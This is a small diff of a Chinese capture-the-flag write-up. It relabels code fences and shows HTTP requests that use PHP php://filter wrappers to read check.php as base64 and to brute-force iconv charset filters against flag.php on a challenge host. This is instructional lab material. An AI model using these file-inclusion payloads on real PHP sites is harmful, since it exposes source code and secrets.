@@ -13,7 +13,7 @@ highlight_file(__FILE__);
 ?>
 ```
 伪协议
-```
+```http request
 GET /?filename=php://filter/convert.base64-encode/resource=./check.php/ HTTP/1.1
 ```
 * 【base64编码 是为了防止flag 在代码的注释中，所以使用base64解码 显示注释部分】
@@ -136,7 +136,7 @@ ArmSCII-8
 ```
 
 ## payload
-```
+```http request
 GET /?filename=php://filter/convert.iconv.§§.§§/resource=flag.php / HTTP/1.1
 Host: 61.147.171.105:56702
 Cache-Control: max-age=0
